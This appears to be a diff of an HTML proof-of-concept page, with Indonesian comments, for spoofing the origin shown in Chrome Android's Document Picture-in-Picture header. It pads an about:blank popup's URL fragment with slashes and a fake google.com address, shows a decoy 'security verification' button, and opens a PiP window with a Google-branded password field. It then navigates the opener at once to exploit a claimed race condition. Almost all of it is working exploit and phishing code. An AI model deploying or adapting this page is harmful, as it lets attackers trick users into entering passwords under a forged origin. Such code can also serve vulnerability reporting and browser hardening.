@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Document PiP Header Spoof (Android 16+ Only)</title>
+    <title>Doc-PiP Race Condition PoC</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
     <script>
@@ -12,39 +12,44 @@
                 step++;
 
                 if (step === 1) {
-                    // Klik pertama: buka popup about:blank dengan payload
-                    // Fragment berisi 300 garis miring + URL palsu, memanfaatkan fallback empty-host dan TruncateAt.START
+                    // Langkah 1: buka popup about:blank, muat payload spoofing di fragment
                     const padding = '/'.repeat(300);
                     const spoofedUrl = 'https://www.google.com/';
                     const popup = window.open('about:blank#' + padding + spoofedUrl, 'poc', 'width=400,height=400');
 
                     if (!popup) {
-                        document.body.innerHTML = '<h1 style="color:orange;">Popup diblokir, silakan izinkan popup</h1>';
+                        document.body.innerHTML = '<h1 style="color:orange;">Popup diblokir</h1>';
                         return;
                     }
 
-                    // Gunakan DOM API untuk menulis tombol tipuan (jangan gunakan document.write, jika tidak URL akan di-reset)
+                    // Tulis tombol tipuan ke dalam popup
                     popup.document.body.innerHTML = `
                         <h1 style="color:#333;">Verifikasi Keamanan</h1>
-                        <p>Silakan ketuk untuk melanjutkan</p>
                         <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
                     `;
 
-                    // Klik kedua: terjadi di dalam popup, memicu Document PiP
+                    // Langkah 2: klik tombol, picu PiP, SEGERA navigasi (race condition)
                     popup.document.getElementById('pipBtn').addEventListener('click', async () => {
                         try {
+                            // Buka jendela Document PiP
                             const pipWin = await documentPictureInPicture.requestWindow({
                                 width: 220,
                                 height: 300
                             });
 
-                            // Tulis formulir phishing ke dalam jendela PiP
+                            // Tulis formulir phishing ke dalam PiP
                             pipWin.document.body.innerHTML = `
                                 <h2 style="color:red;">Google</h2>
-                                <p>Verifikasi akun Anda</p>
-                                <input type="password" placeholder="Kata sandi" style="width:100%;margin:10px 0;">
-                                <button style="width:100%;">Masuk</button>
+                                <p>Verifikasi akun</p>
+                                <input type="password" placeholder="Kata sandi" style="width:100%;">
                             `;
+
+                            // ==== Inti race condition ====
+                            // Segera navigasi opener, memanfaatkan jendela waktu observer belum terdaftar (100-500ms)
+                            // Header PiP akan menampilkan google.com (dari payload), bukan URL sebenarnya
+                            window.location.href = 'https://www.google.com';
+                            // ============================
+
                         } catch (e) {
                             popup.document.body.innerHTML = 
                                 `<h1 style="color:gray;">PiP gagal: ${e.message}</h1>`;
@@ -58,11 +63,8 @@
 <body style="margin:0;padding:0;">
     <br><br><br>
     <center>
-        <h1>Ketuk di mana saja untuk memulai (dua kali)</h1>
-        <p style="color:#666;">Klik pertama: buka popup · Klik kedua: picu PiP</p>
-        <p style="color:#999;font-size:12px;">
-            Hanya untuk Chrome Android 16+ · Memerlukan mode desktop-windowing · Memerlukan flag chrome://flags#enable-android-document-picture-in-picture
-        </p>
+        <h1>Ketuk di mana saja untuk memulai</h1>
+        <p style="color:#666;">Klik 1: buka popup · Klik 2: picu PiP + race condition</p>
     </center>
 </body>
 </html>
